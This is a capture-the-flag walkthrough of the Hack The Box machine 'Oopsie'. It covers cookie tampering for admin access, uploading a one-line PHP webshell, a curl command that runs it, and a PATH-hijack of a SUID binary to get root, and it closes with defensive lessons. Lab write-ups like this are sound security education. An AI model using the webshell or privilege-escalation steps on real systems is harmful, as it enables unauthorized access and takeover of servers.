---
title: "Oopsie — Hack The Box Walkthrough"
description: "Escalating on Oopsie via IDOR, cookie tampering, and a SUID binary with a relative-path command."
date: 2026-09-02
category: offensive
readTime: "5 min read"
mitre:
  - "T1190"
  - "T1068"
tags:
  - "Hack The Box"
  - "IDOR"
  - "Cookie Tampering"
  - "SUID"
  - "PATH Hijacking"
  - "Linux"
  - "CTF"
summary: "Escalating on Oopsie via IDOR, cookie tampering, and a SUID binary with a relative-path command."
---

**Machine:** Oopsie
**Difficulty:** Easy
**Key Techniques:** IDOR, cookie tampering, webshell upload, SUID + relative path abuse

---

## Enumeration

### Port Scanning

```
22/tcp  ssh   OpenSSH (Ubuntu)
80/tcp  http  Title: Welcome
```

The web app is titled **"Welcome"** on port 80.

---

## Exploitation

### IDOR / Broken Access Control

Enumerating reveals `/cdn-cgi/login`. Logging in as `guest` shows the app uses role-based access via a **tamperable cookie**. Changing the role to `admin` and the user ID grants admin-only access — an **IDOR / broken access control** flaw.

### Webshell Upload

The admin portal has a file upload page. Upload a PHP webshell:

```php
<?php system($_GET['cmd']); ?>
```

```bash
curl "http://10.129.95.191/uploads/shell.php?cmd=id"
```

Stabilize the shell:

```
user.txt: <flag>
```

---

## Privilege Escalation — SUID Binary

A SUID binary `/usr/bin/bugtracker` internally calls `cat` using a **relative path** (not `/bin/cat`). Abuse PATH:

```bash
echo "/bin/sh" > cat
chmod 777 cat
export PATH=/tmp:$PATH
/usr/bin/bugtracker
```

Root shell obtained:

```
root.txt: <flag>
```

---

## Lessons Learned

1. **Never trust client-side values for authorization.** Role and user IDs must be validated server-side, not read from a tamperable cookie.
2. **Secure file uploads** — validate types/names and never allow PHP execution from writeable upload dirs.
3. **SUID binaries using relative paths are dangerous** — always use absolute paths internally.
